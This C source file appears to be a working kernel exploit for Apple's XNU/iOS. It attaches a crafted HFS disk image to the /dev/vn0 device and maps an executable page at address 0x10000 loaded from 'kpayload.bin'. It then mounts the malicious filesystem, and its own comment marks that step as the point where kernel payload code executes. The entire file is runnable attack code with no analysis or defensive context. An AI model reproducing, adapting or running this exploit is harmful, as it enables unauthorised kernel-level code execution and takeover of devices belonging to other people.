#include <sys/mman.h>
#include <sys/mount.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioccom.h>
#define KERNEL_PRIVATE
#include <sys/vnioctl.h>
#undef KERNEL_PRIVATE
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <mach/boolean.h>

struct hfs_mount_args {
    char     *fspec;
    uid_t     hfs_uid;
    gid_t     hfs_gid;
    mode_t    hfs_mask;
    u_int32_t hfs_encoding;
    struct    timezone hfs_timezone;
    int       flags;
    int       journal_tbuffer_size;
    int       journal_flags;
    int       journal_disable;
};

int readfile(char *filename, void* buffer, unsigned int skip) {
        FILE* file = fopen(filename, "rb");
        if (file == NULL) {
                printf("File %s not found.\n", filename);
                return 1;
        }
        fseek(file, 0, SEEK_END);
        int len = ftell(file);
        fseek(file, skip, SEEK_SET);
        fread(buffer, 1, len - skip, file);
        fclose(file);

        return len-skip;
}

void prepare_vndevice() {
	struct vn_ioctl vn;

	int fd = open("/dev/vn0", O_RDONLY, 0);
	if (fd < 0) {
	    	printf("Can't openn /dev/vn0 special file.\n");
		exit(1);
	}

	// detach
	ioctl(fd, VNIOCDETACH, &vn);

	// attach
	vn.vn_file = "hfs_mdb";
	vn.vn_control = vncontrol_readwrite_io_e;
	if (ioctl(fd, VNIOCATTACH, &vn) < 0) {
		printf("Can't attach vn0.\n");
		close(fd);
		exit(1);
	}
	close(fd);
}

void mount_evil_hfs() {
	struct hfs_mount_args mount_args;
	memset(&mount_args, 0, sizeof(mount_args));
	mount_args.fspec="/dev/vn0";
	mount_args.hfs_uid=99;
	mount_args.hfs_gid=99;
	mount_args.hfs_mask=(S_IRWXU | S_IROTH | S_IXOTH);
	int ret = mount("hfs", "/mnt/", MNT_RDONLY, (void*) &mount_args);
	
	//*** kernel payload code execution happens here ***
	
	printf("mount ret code : 0x%X\n", ret);
	if (ret < 0) {
		printf("hfs mount failed. :-(\n");
		exit(1);
	}
}

void mmap_kernel_payload_page0() {
	unsigned int *mmap_addr;
	void* addr = (void *) 0x10000;
	size_t length = 0x1000;

	mmap_addr = mmap(addr, length, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);	
	printf("mmap ret addr : 0x%X\n", (unsigned int) mmap_addr);

	if (mmap_addr != (unsigned int*) addr) {
		printf("Can't mmap 0x%X page.\n", (unsigned int) addr);
		exit(1);
	}

	readfile("kpayload.bin", mmap_addr, 0);
}

int main(int argc, char* argv[]) {
	prepare_vndevice();
	mmap_kernel_payload_page0();
	mount_evil_hfs();
}
